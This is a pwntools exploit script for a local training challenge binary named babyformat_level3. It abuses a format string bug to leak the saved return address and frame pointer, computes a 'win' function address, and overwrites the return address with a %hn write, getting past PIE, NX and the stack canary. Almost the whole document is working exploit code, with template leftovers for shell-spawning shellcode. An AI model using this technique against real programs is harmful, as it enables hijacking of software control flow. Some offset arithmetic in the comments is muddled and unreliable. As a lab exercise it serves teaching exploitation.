#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyformat_level3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

input()
# x/gx $rbp + 8 - x/gx $rsp --> divide by 8 + 6(for 6th arg)
# saved rip at 199th argument
exploit1 = b'%151$lx'

io.send(exploit1)
io.recvuntil('input is:')
io.recvline()
#return add saved at saved rip
ret_address = int(io.recvline(keepends = False),16)

# because ret address is very long, buffer might not be able to print all 0s due ot memory issues.. so we only take last 4 bytes. (Last Nibble)
print(hex(ret_address)[-4:])
ret_int =  int(hex(ret_address)[-4:],16)

#offset calculation by doing func address from objdump main, and then subtract win address from objdump --> 1728 - 1330 -> 1016
win_address = ret_int - 1016
print(hex(win_address))
print(len(str(win_address)))

# saved rbp at 198th argument (stored in rbp)
exploit2 = b'%150$lx'
io.send(exploit2)
io.recvuntil('input is:')
io.recvline()
rbp_address = int(io.recvline(keepends = False),16)
print(hex(rbp_address))

# currentb = 602
# buf = b"%04199197d%36$ln" + p64(0x404050)
# buf = b'%0'+str(4199197).encode() + b'd%36$ln' + p64(0x404050)
# io.send(buf)

#Final format string.. so pass %0.. then because we already have 122 chars because of "Your input is...... \n"
#x/gx $rdi - x/gx $rsp --> 480/8 --> 60 + 15 bytes to fit 122 chars + 6 bytes for pos arg..

#2 more bytes to fit this format string itself..
#saved rbp and rbp+8.. have constant offset of 72.. so to find rbp + 8, we sub 72..
exploit3 = b'%0'+ str(win_address-119).encode() + b'd%35$hn' +  b'a'*3 + p64(rbp_address-72)
# print(len(exploit3))
# print(exploit3)
io.send(exploit3)
io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

